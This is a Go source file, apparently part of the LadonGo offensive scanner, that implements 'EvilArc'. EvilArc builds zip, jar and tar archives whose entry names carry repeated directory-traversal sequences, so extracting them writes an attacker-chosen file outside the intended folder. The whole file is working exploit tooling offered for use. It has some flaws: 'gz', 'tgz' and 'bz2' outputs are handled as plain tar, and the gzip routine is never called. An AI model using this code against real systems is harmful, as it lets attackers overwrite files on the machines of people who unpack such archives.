package exp
//Ladon Scanner for golang 
//Author: k8gege
//K8Blog: http://k8gege.org/Ladon
//Github: https://github.com/k8gege/LadonGo
//Date:2022.7.10
import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"strings"
	"time"
)

var (
	outputFile     string
	platform       string
	prePath        string
	customIterator string
	depth          int
)

func dozip(filename string, out *os.File, content []byte) {
	// Define ZipWriter writing to out file
	zw := zip.NewWriter(out)
	defer zw.Close()

	// Create file in zip archive with traversal
	zipContent, err := zw.Create(filename)
	if err != nil {
		fmt.Println(err)
		os.Exit(2)
	}

	// Write content of infile to that traversal file
	_, err = zipContent.Write(content)
	if err != nil {
		fmt.Println(err)
		os.Exit(2)
	}

	// Close zip writer
	if err = zw.Close(); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
}

func dotar(filename string, out *os.File, content []byte) {
	// Define TarWriter writing to out file
	tw := tar.NewWriter(out)
	defer tw.Close()

	// Construct header
	hdr := &tar.Header{
		Name:    filename,
		Mode:    int64(os.ModePerm),
		Size:    int64(len(content)),
		ModTime: time.Now(),
	}
	// Write header
	if err := tw.WriteHeader(hdr); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
	// Write content
	if _, err := tw.Write(content); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
	// Close TarWriter
	if err := tw.Close(); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
}

func dogz(filename string, out *os.File, content []byte) {
	// Define GzipWriter writing to out file
	gw := gzip.NewWriter(out)
	defer gw.Close()

	// Set Header
	gw.Name = filename
	gw.Comment = "How dare you"
	gw.ModTime = time.Date(1977, time.May, 25, 0, 0, 0, 0, time.UTC)

	// Write content
	if _, err := gw.Write(content); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}

	// Close GzipWriter
	if err := gw.Close(); err != nil {
		fmt.Println(err)
		os.Exit(2)
	}
}

func EvilArc(outputFile string,depth int,prePath,platform, inputFile string) {
	var iterator string

	// Current working directory
	cwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	//fmt.Println(cwd)

	// Read input file as last argument
	//inputFile := os.Args[len(os.Args)-1]
	inputContent, err := ioutil.ReadFile(path.Join(cwd, inputFile))
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// Switch over platform to check which iterator to use
	switch platform {
	case "win":
		iterator = "..\\"
	case "lnx":
		iterator = "../"
	}

	// If there is a custom iterator use this instead
	if customIterator != "" {
		iterator = customIterator
	}

	// construct the out path
	// for usage as filename in archive
	outPath := fmt.Sprintf("%s%s%s", strings.Repeat(iterator, depth), prePath, inputFile)
	fmt.Printf("The filename in the archive will be: %s\n", outPath)

	// Create out file
	outFile, err := os.Create(outputFile)
	if err != nil {
		fmt.Println(err)
	}
	defer outFile.Close()

	// Switch over extension of output file
	ext := strings.Split(outputFile, ".")
	finalExt := ext[len(ext)-1]

	switch finalExt {
	case "zip":
		dozip(outPath, outFile, inputContent)
	case "jar":
		dozip(outPath, outFile, inputContent)
	case "tar":
		dotar(outPath, outFile, inputContent)
	case "gz":
		dotar(outPath, outFile, inputContent)
	case "tgz":
		dotar(outPath, outFile, inputContent)
	case "bz2":
		dotar(outPath, outFile, inputContent)
	default:
		fmt.Println("Could not identify target format. Choose from: .zip, .jar, .tar, .gz, .tgz, .bz2")
		os.Exit(1)
	}

	fmt.Printf("%s was written.\n", outputFile)
}
